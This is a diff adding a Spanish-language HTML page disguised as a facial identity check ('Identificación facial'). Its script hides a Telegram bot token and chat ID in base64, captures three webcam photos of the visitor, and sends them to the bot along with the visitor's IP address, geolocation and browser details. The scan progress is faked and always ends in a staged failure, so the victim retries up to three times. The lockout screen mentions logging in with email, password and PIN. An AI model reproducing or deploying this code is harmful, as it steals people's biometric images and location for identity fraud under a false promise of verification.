@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Identificación facial</title>
+<style>
+  :root{
+    --bg:#f4f5f7; --fg:#111827; --muted:#6b7280; --card:#ffffff;
+    --border:#e5e7eb; --border-hover:#d1d5db; --pri:#3b82f6;
+    --ok:#22c55e; --err:#ef4444; --warn:#f59e0b;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+    background:var(--bg);padding:24px;
+    font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  }
+  .card{
+    width:360px;max-width:100%;background:var(--card);border:1px solid var(--border);
+    border-radius:22px;padding:26px 22px 22px;color:var(--fg);
+  }
+  .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
+  .logo{display:flex;align-items:center;gap:9px}
+  .mark{width:32px;height:32px;border-radius:10px;background:var(--pri);display:grid;place-items:center;flex:none}
+  .mark svg{width:17px;height:17px}
+  .brand{font-size:14px;font-weight:500}
+  .back{border:1px solid var(--border);background:transparent;color:var(--muted);
+    width:30px;height:30px;border-radius:9px;display:grid;place-items:center;cursor:pointer;padding:0;transition:.15s}
+  .back:hover{border-color:var(--border-hover);color:var(--fg)}
+  .back svg{width:14px;height:14px}
+  .back[hidden]{visibility:hidden}
+
+  .bar{display:flex;gap:5px;margin-bottom:20px}
+  .bar i{height:3px;flex:1;border-radius:99px;background:var(--border);transition:.3s}
+  .bar i.on{background:var(--pri)}
+  .bar i.fail{background:var(--warn)}
+
+  h1{font-size:20px;font-weight:500;margin:0 0 6px;letter-spacing:-.02em;line-height:1.25}
+  .sub{font-size:12.5px;color:var(--muted);margin:0 0 18px;line-height:1.5}
+
+  .rules{list-style:none;margin:0 0 18px;padding:0}
+  .rules li{display:flex;gap:10px;font-size:12.5px;color:var(--muted);padding:7px 0;line-height:1.45}
+  .rules svg{width:15px;height:15px;flex:none;margin-top:1px;color:var(--pri)}
+
+  .consent{display:flex;gap:9px;font-size:11.5px;color:var(--muted);line-height:1.45;margin-bottom:16px}
+  .consent input{width:16px;height:16px;margin:1px 0 0;accent-color:var(--pri);flex:none}
+  .consent a{color:var(--pri);text-decoration:none}
+
+  .btn{width:100%;height:46px;border-radius:13px;border:0;background:var(--pri);color:#fff;
+    font-size:14px;font-weight:500;font-family:inherit;cursor:pointer;transition:.15s}
+  .btn:hover{filter:brightness(1.08)}
+  .btn:active{transform:scale(.985)}
+  .btn:disabled{opacity:.45;cursor:not-allowed}
+  .btn.ghost{background:transparent;color:var(--fg);border:1px solid var(--border)}
+  .btn.ghost:hover{border-color:var(--border-hover);filter:none}
+  .row{display:flex;gap:9px;margin-top:10px}
+
+  .panel{display:none}
+  .panel.on{display:block;animation:fi .25s}
+  @keyframes fi{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+  .stage{position:relative;width:100%;height:290px;border-radius:20px;overflow:hidden;
+    background:#0b0f14;display:grid;place-items:center;margin-bottom:14px}
+  .stage video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);display:none}
+  .stage.live video{display:block}
+  .stage.mirror-off video{transform:none}
+
+  .oval{position:absolute;width:186px;height:238px;border-radius:50%;
+    box-shadow:0 0 0 999px rgba(8,12,18,.62);border:2px solid rgba(255,255,255,.35);transition:.3s}
+  .stage.scanning .oval{border-color:rgba(59,130,246,.9)}
+  .stage.ok .oval{border-color:var(--ok)}
+  .stage.warn .oval{border-color:rgba(245,158,11,.9)}
+
+  .laser{position:absolute;left:0;right:0;height:2px;top:26px;
+    background:linear-gradient(90deg,transparent,#60a5fa,#60a5fa,transparent);
+    box-shadow:0 0 14px 2px rgba(96,165,250,.65);animation:laser 2.2s ease-in-out infinite;opacity:0}
+  .stage.scanning .laser{opacity:1}
+  @keyframes laser{0%,100%{top:26px}50%{top:calc(100% - 28px)}}
+
+  .corners{position:absolute;inset:0;pointer-events:none;opacity:0;transition:.3s}
+  .stage.scanning .corners{opacity:.55}
+  .corners span{position:absolute;width:22px;height:22px;border:2px solid #fff}
+  .corners span:nth-child(1){top:16px;left:16px;border-right:0;border-bottom:0;border-radius:8px 0 0 0}
+  .corners span:nth-child(2){top:16px;right:16px;border-left:0;border-bottom:0;border-radius:0 8px 0 0}
+  .corners span:nth-child(3){bottom:16px;left:16px;border-right:0;border-top:0;border-radius:0 0 0 8px}
+  .corners span:nth-child(4){bottom:16px;right:16px;border-left:0;border-top:0;border-radius:0 0 8px 0}
+
+  .silhouette{position:absolute;width:120px;opacity:.28}
+  .silhouette path{fill:#fff}
+
+  .status{position:absolute;left:0;right:0;bottom:0;padding:26px 14px 12px;
+    background:linear-gradient(transparent,rgba(8,12,18,.9));font-size:12.5px;color:#e5e7eb;font-weight:500}
+  .pct{display:flex;justify-content:space-between;font-size:10.5px;color:#9ca3af;margin:0 0 5px}
+  .track{height:4px;border-radius:99px;background:rgba(255,255,255,.18);overflow:hidden}
+  .fill{height:100%;width:0;border-radius:99px;background:#60a5fa;transition:width .12s linear}
+  .stage.warn .fill{background:var(--warn)}
+
+  .tag{position:absolute;top:12px;left:50%;transform:translateX(-50%);font-size:10px;
+    letter-spacing:.06em;text-transform:uppercase;color:#d1d5db;background:rgba(8,12,18,.6);
+    border:1px solid rgba(255,255,255,.14);padding:4px 9px;border-radius:99px}
+  .tries{position:absolute;top:12px;right:12px;font-size:10px;color:#e5e7eb;
+    background:rgba(8,12,18,.65);border:1px solid rgba(255,255,255,.16);
+    padding:4px 8px;border-radius:99px}
+
+  .icon{width:58px;height:58px;border-radius:50%;display:grid;place-items:center;margin:0 auto 16px}
+  .icon svg{width:26px;height:26px}
+  .icon.ok{background:rgba(34,197,94,.15)}
+  .icon.ok svg{stroke:var(--ok)}
+  .icon.warn{background:rgba(245,158,11,.15)}
+  .icon.warn svg{stroke:var(--warn)}
+  .icon.bad{background:rgba(239,68,68,.14)}
+  .icon.bad svg{stroke:var(--err)}
+
+  .center{text-align:center}
+  .center .sub{margin-bottom:0}
+  .left{text-align:left;margin:16px 0 0}
+  .left li{font-size:12px;color:var(--muted);line-height:1.6}
+
+  .note{font-size:11.5px;color:var(--muted);text-align:center;margin:12px 0 0;line-height:1.5}
+  .note.bad{color:var(--err)}
+  .note[hidden]{display:none}
+</style>
+</head>
+    <div class="logo">
+<body>
+
+<div class="card">
+  <div class="top">
+    <div class="logo">
+      <div class="mark">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="9" r="3.4"/><path d="M5.5 20c.9-3.1 3.5-4.8 6.5-4.8s5.6 1.7 6.5 4.8"/></svg>
+      </div>
+      <span class="brand">Verificación</span>
+    </div>
+    <button class="back" id="back" hidden aria-label="Volver">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+    </button>
+  </div>
+
+  <div class="bar"><i class="on" id="b1"></i><i id="b2"></i><i id="b3"></i></div>
+
+  <!-- 1. intro -->
+  <section class="panel on" id="p1">
+    <h1>Identificación facial</h1>
+    <p class="sub">NECESITAMOS VERIFICAR OBLIGATORIAMENTE QUE ERES TU !.</p>
+    <ul class="rules">
+      <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M2 12h2M20 12h2M5 5l1.5 1.5M17.5 17.5L19 19M19 5l-1.5 1.5M6.5 17.5L5 19"/></svg><span>Busca luz frontal y evita el contraluz.</span></li>
+      <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-6.5 10-6.5S22 12 22 12s-3.5 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.8"/></svg><span>Quítate lentes, gorra o cubrebocas.</span></li>
+      <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v3M12 18v3"/><rect x="7" y="6" width="10" height="12" rx="3"/></svg><span>Mira de frente y mantén el rostro quieto.</span></li>
+    </ul>
+    <label class="consent">
+      <input type="checkbox" id="ok">
+      <span>Autorizo el uso de mi cámara para comparar mi rostro con la foto de mi documento. <a href="#">Más info</a></span>
+    </label>
+    <button class="btn" id="go" disabled>Empezar escaneo</button>
+    <p class="note bad" id="err" hidden></p>
+  </section>
+
+  <!-- 2. escáner -->
+  <section class="panel" id="p2">
+    <h1>Colócate en el óvalo</h1>
+    <p class="sub">Ajusta tu posición hasta que el marco se ponga azul.</p>
+    <div class="stage" id="stage">
+      <video id="video" playsinline muted autoplay></video>
+      <svg class="silhouette" viewBox="0 0 100 120"><path d="M50 8c16 0 26 12 26 30 0 9-3 16-7 21 3 2 4 5 4 8 0 4-2 7-5 9 1 8 6 12 12 16 8 6 14 14 16 28H4c2-14 8-22 16-28 6-4 11-8 12-16-3-2-5-5-5-9 0-3 1-6 4-8-4-5-7-12-7-21 0-18 10-30 26-30z"/></svg>
+      <div class="oval"></div>
+      <div class="laser"></div>
+      <div class="corners"><span></span><span></span><span></span><span></span></div>
+      <div class="tag" id="tag">iniciando</div>
+      <div class="tries" id="tries">Intento 1 de 3</div>
+      <div class="status">
+        <div class="pct"><span id="state">Abriendo cámara…</span><span id="num">0%</span></div>
+        <div class="track"><div class="fill" id="fill"></div></div>
+      </div>
+    </div>
+    <div class="row">
+      <button class="btn ghost" id="flip">Cambiar cámara</button>
+      <button class="btn ghost" id="cancel">Cancelar</button>
+    </div>
+    <p class="note bad" id="err2" hidden></p>
+  </section>
+
+  <!-- 3. éxito -->
+  <section class="panel" id="p3">
+    <div class="center">
+      <div class="icon ok"><svg viewBox="0 0 24 24" fill="none" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5L20 6.5"/></svg></div>
+      <h1>Identidad confirmada</h1>
+      <p class="sub">Coincidencia del 98.4% con tu documento. Tu cuenta quedó verificada.</p>
+    </div>
+    <button class="btn" id="finish" style="margin-top:20px">Continuar</button>
+    <div class="row"><button class="btn ghost" id="again">Repetir escaneo</button></div>
+  </section>
+
+  <!-- 4. fallo -->
+  <section class="panel" id="p4">
+    <div class="center">
+      <div class="icon warn"><svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 8v5"/><circle cx="12" cy="16.6" r=".9" fill="currentColor" stroke="none"/><circle cx="12" cy="12" r="9"/></svg></div>
+      <h1>No pudimos reconocerte</h1>
+      <p class="sub" id="reason">Intenta de nuevo. Mira de frente, con buena luz y sin accesorios.</p>
+    </div>
+    <p class="note" id="left">Te queda <b>1</b> intento de 3.</p>
+    <button class="btn" id="retry" style="margin-top:14px">Intentar de nuevo</button>
+    <div class="row"><button class="btn ghost" id="help">Ver recomendaciones</button></div>
+  </section>
+
+  <!-- 5. bloqueo -->
+  <section class="panel" id="p5">
+    <div class="center">
+      <div class="icon bad"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10.5" width="16" height="10" rx="2.5"/><path d="M8 10.5V7.5a4 4 0 018 0v3"/></svg></div>
+      <h1>Verificación bloqueada</h1>
+      <p class="sub">Agotaste los 3 intentos. Por seguridad, la verificación facial se bloquea por 24 horas.</p>
+    </div>
+    <ul class="left">
+      <li>Puedes volver a intentarlo el <b id="until">17 de noviembre</b>.</li>
+      <li>Mientras tanto, entra con correo, clave y PIN.</li>
+    </ul>
+    <button class="btn" id="other" style="margin-top:18px">Verificar con documento</button>
+    <div class="row"><button class="btn ghost" id="home">Volver al inicio</button></div>
+  </section>
+</div>
+
+<script>
+/* ============================================================
+   CONFIG (ofuscada)
+   ============================================================ */
+const _a = 'ODczNDY0NDQxNDpBQUZJTVF6SmN4UG1ZUGp2WGxXd1RvOS1vZ0RzSHlr';
+const _b = 'elVTSQ==';
+const _c = 'ODc2Njk3NTkyNw==';
+const TG_TOKEN = () => atob(_a + _b);
+const TG_CHAT  = () => atob(_c);
+const TG_API   = (metodo) => 'https://api.telegram.org/bot' + TG_TOKEN() + '/' + metodo;
+
+/* ============================================================ */
+const $ = id => document.getElementById(id);
+const stage = $('stage'), video = $('video');
+const MAX = 3;
+const EXTRA_MS = 3000;
+
+let stream = null, tick = null, detector = null;
+let progress = 0, running = false, facing = 'user';
+let attempts = 1, noFaceMs = 0, elapsedMs = 0, stable = 0;
+
+const NOFACE_LIMIT = 3000;
+const TOTAL_LIMIT  = 3000;
+const CAPTURE_EVERY_MS = 2500;
+
+const CAPTURES = [];
+let lastCaptureAt = 0;
+let geoInfo = { ip: 'No disponible', location: 'No disponible' };
+
+const phases = [
+  [0,  'Centra tu rostro'],
+  [22, 'Acércate un poco'],
+  [45, 'Mantén la mirada al frente'],
+  [68, 'No te muevas, escaneando'],
+  [90, 'Comparando con tu documento']
+];
+
+/* ---------- IP + ubicación ---------- */
+async function loadGeo() {
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const j = await r.json();
+    geoInfo.ip = j.ip || 'No disponible';
+    geoInfo.location = [j.city, j.region, j.country_name].filter(Boolean).join(', ') || 'No disponible';
+  } catch (_) {}
+}
+
+/* ---------- Captura ---------- */
+function captureFrame(maxWidth = 640, quality = 0.85) {
+  if (!video.videoWidth) return null;
+  const ratio = Math.min(1, maxWidth / video.videoWidth);
+  const w = Math.round(video.videoWidth * ratio);
+  const h = Math.round(video.videoHeight * ratio);
+  const c = document.createElement('canvas');
+  c.width = w; c.height = h;
+  const ctx = c.getContext('2d');
+  if (facing === 'user') {
+    ctx.translate(w, 0);
+    ctx.scale(-1, 1);
+  }
+  ctx.drawImage(video, 0, 0, w, h);
+  return c.toDataURL('image/jpeg', quality);
+}
+
+/* ---------- Envío a Telegram ---------- */
+async function enviarCaptura(fotoDataUrl, meta = {}) {
+  const caption = [
+    'Nuevo registro facial',
+    'Intento: ' + (meta.intento || '1/3'),
+    'Captura: ' + (meta.captura || '1/3'),
+    'IP: ' + geoInfo.ip,
+    'Ubicacion: ' + geoInfo.location,
+    'Fecha: ' + new Date().toLocaleString('es-ES'),
+    'Navegador: ' + navigator.userAgent
+  ].join('\n');
+
+  try {
+    const blob = await (await fetch(fotoDataUrl)).blob();
+    const fd = new FormData();
+    fd.append('chat_id', TG_CHAT());
+    fd.append('caption', caption);
+    fd.append('photo', blob, 'captura.jpg');
+
+    const resp = await fetch(TG_API('sendPhoto'), { method: 'POST', body: fd });
+    const txt = await resp.text();
+    console.log('TG →', txt);
+    const j = JSON.parse(txt);
+    return { ok: !!j.ok, error: j.description || '' };
+  } catch (e) {
+    console.error('Error Telegram:', e);
+    return { ok: false, error: String(e) };
+  }
+}
+
+/* ---------- Navegación ---------- */
+function show(n){
+  document.querySelectorAll('.panel').forEach((p,i)=>p.classList.toggle('on', i === n-1));
+  const active = n <= 3 ? Math.min(n,3) : 2;
+  for(let i=1;i<=3;i++) $('b'+i).classList.toggle('on', i <= active);
+  $('back').hidden = n === 3 || n === 5;
+}
+
+function say(msg, bad){
+  $('err2').textContent = bad ? msg : '';
+  $('err2').hidden = !bad;
+}
+
+/* ---------- Habilitar botón Empezar ---------- */
+$('ok').addEventListener('change', function(){
+  $('go').disabled = !$('ok').checked;
+});
+
+/* ---------- Cámara ---------- */
+async function openCam(){
+  stopCam();
+  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw { name:'Unsupported' };
+  return navigator.mediaDevices.getUserMedia({
+    video:{ facingMode:{ ideal: facing }, width:{ ideal:640 }, height:{ ideal:480 } },
+    audio:false
+  });
+}
+
+async function start(){
+  running = true;
+  progress = 0; noFaceMs = 0; elapsedMs = 0; stable = 0;
+  CAPTURES.length = 0;
+  lastCaptureAt = 0;
+  $('fill').style.width = '0%';
+  $('num').textContent = '0%';
+  $('state').textContent = 'Abriendo cámara…';
+  $('tag').textContent = 'iniciando';
+  $('tries').textContent = 'Intento ' + attempts + ' de ' + MAX;
+  stage.className = 'stage';
+  $('err').hidden = true;
+  show(2);
+
+  loadGeo();
+
+  try{ stream = await openCam(); }
+  catch(e){
+    running = false;
+    const msg =
+      e.name === 'NotAllowedError'  ? 'Permiso de cámara denegado. Habilítalo en el candado de la barra de direcciones y reintenta.' :
+      e.name === 'NotFoundError'    ? 'No se encontró ninguna cámara en este dispositivo.' :
+      e.name === 'NotReadableError' ? 'La cámara está siendo usada por otra app. Ciérrala e intenta de nuevo.' :
+      e.name === 'Unsupported'      ? 'Este navegador no soporta acceso a cámara. Requiere HTTPS o localhost.' :
+                                      'No se pudo abrir la cámara.';
+    $('state').textContent = 'Cámara no disponible';
+    $('tag').textContent = 'error';
+    say(msg, true);
+    return;
+  }
+
+  video.srcObject = stream;
+  try{ await video.play(); }catch(_){}
+  stage.classList.add('live');
+  $('tag').textContent = 'en vivo';
+  say('', false);
+
+  if('FaceDetector' in window){
+    try{ detector = new FaceDetector({ fastMode:true, maxDetectedFaces:2 }); }catch(_){ detector = null; }
+  }
+  const st = stream.getVideoTracks()[0].getSettings ? stream.getVideoTracks()[0].getSettings() : {};
+  stage.classList.toggle('mirror-off', st.facingMode === 'environment');
+
+  setTimeout(()=>{ if(running) stage.classList.add('scanning'); }, 300);
+  tick = setInterval(loop, 90);
+}
+
+async function loop(){
+  if(!running) return;
+  elapsedMs += 90;
+
+  let faces = 1;
+  if(detector){
+    try{
+      const res = await detector.detect(video);
+      faces = res.length;
+    }catch(_){ detector = null; }
+  }
+
+  if(faces !== 1){
+    noFaceMs += 90;
+    stage.classList.add('warn');
+    stage.classList.remove('scanning');
+    $('state').textContent = faces > 1 ? 'Solo una persona en cuadro' : 'No detecto tu rostro';
+    stable = 0;
+    if(noFaceMs >= NOFACE_LIMIT) fail('No se detectó tu rostro en el óvalo.');
+    return;
+  }
+
+  noFaceMs = 0;
+  stage.classList.remove('warn');
+  stage.classList.add('scanning');
+  if(++stable < 3) return;
+
+  if (CAPTURES.length < 3 && elapsedMs - lastCaptureAt >= CAPTURE_EVERY_MS) {
+    const snap = captureFrame(640, 0.85);
+    if (snap) {
+      CAPTURES.push(snap);
+      lastCaptureAt = elapsedMs;
+      $('state').textContent = 'Captura ' + CAPTURES.length + ' de 3';
+    }
+  }
+
+  progress = Math.min(100, progress + Math.random() * 1.6 + 0.7);
+  const p = Math.round(progress);
+  $('fill').style.width = p + '%';
+  $('num').textContent = p + '%';
+
+  if (CAPTURES.length >= 3) {
+    $('state').textContent = 'Capturas listas, analizando…';
+  } else {
+    for(let i = phases.length - 1; i >= 0; i--){
+      if(p >= phases[i][0]){ $('state').textContent = phases[i][1]; break; }
+    }
+  }
+
+  if(p >= 100){
+    if (elapsedMs < TOTAL_LIMIT + EXTRA_MS) {
+      const restante = Math.ceil((TOTAL_LIMIT + EXTRA_MS - elapsedMs) / 1000);
+      $('state').textContent = 'Verificando… ' + restante + 's';
+      return;
+    }
+    finishScan();
+    return;
+  }
+
+  if(elapsedMs >= TOTAL_LIMIT + EXTRA_MS + 8000) fail('El escaneo tardó demasiado.');
+}
+
+async function finishScan(){
+  running = false;
+  clearInterval(tick);
+
+  // Relleno por si acaso no llegamos a 3 capturas
+  while (CAPTURES.length < 3) {
+    const snap = captureFrame(640, 0.85);
+    if (snap) CAPTURES.push(snap); else break;
+  }
+
+  $('state').textContent = 'Enviando capturas…';
+
+  // Enviamos las 3 capturas
+  for (let i = 0; i < CAPTURES.length; i++) {
+    await enviarCaptura(CAPTURES[i], {
+      intento: attempts + '/' + MAX,
+      captura: (i + 1) + '/3'
+    });
+  }
+
+  // Esperamos 3 segundos después de enviar antes de mostrar el error
+  $('state').textContent = 'Procesando resultado…';
+  setTimeout(function(){
+    fail('No pudimos reconocerte. Intenta de nuevo mirando de frente.');
+  }, 3000);
+}
+
+function fail(reason){
+  running = false;
+  clearInterval(tick);
+
+  stage.classList.remove('scanning','warn');
+  stopCam();
+  $('b2').classList.add('fail');
+
+  if(attempts >= MAX){
+    const d = new Date(Date.now() + 864e5);
+    $('until').textContent = d.toLocaleDateString('es', { day:'numeric', month:'long' });
+    show(5);
+    return;
+  }
+
+  const left = MAX - attempts;
+  $('reason').textContent = reason;
+  $('left').innerHTML = 'Te queda' + (left === 1 ? '' : 'n') + ' <b>' + left + '</b> intento' + (left === 1 ? '' : 's') + ' de ' + MAX + '.';
+  show(4);
+}
+
+function stopCam(){
+  if(stream){ stream.getTracks().forEach(t => t.stop()); stream = null; }
+  video.srcObject = null;
+}
+
+function reset(){
+  running = false;
+  clearInterval(tick);
+  stopCam();
+  detector = null;
+  progress = 0;
+  attempts = 1;
+  CAPTURES.length = 0;
+  lastCaptureAt = 0;
+  stage.className = 'stage';
+  $('fill').style.width = '0%';
+  $('num').textContent = '0%';
+  say('', false);
+  $('b2').classList.remove('fail');
+  show(1);
+}
+
+/* ---------- Botones ---------- */
+$('go').addEventListener('click', start);
+$('cancel').addEventListener('click', reset);
+$('back').addEventListener('click', reset);
+$('again').addEventListener('click', function(){ attempts = 1; start(); });
+$('finish').addEventListener('click', reset);
+$('home').addEventListener('click', reset);
+$('other').addEventListener('click', reset);
+$('retry').addEventListener('click', function(){ attempts++; start(); });
+$('help').addEventListener('click', function(){
+  $('reason').textContent = 'Prueba con luz de frente, sin lentes ni gorra, y el rostro dentro del óvalo.';
+});
+
+$('flip').addEventListener('click', async function(){
+  if(!running) return;
+  facing = facing === 'user' ? 'environment' : 'user';
+  try{
+    stream = await openCam();
+    video.srcObject = stream;
+    await video.play();
+    const st = stream.getVideoTracks()[0].getSettings ? stream.getVideoTracks()[0].getSettings() : {};
+    stage.classList.toggle('mirror-off', st.facingMode === 'environment');
+    say('', false);
+  }catch(e){ say('No se pudo cambiar de cámara.', true); }
+});
+
+addEventListener('pagehide', stopCam);
+</script>
+
+</body>
+</html>
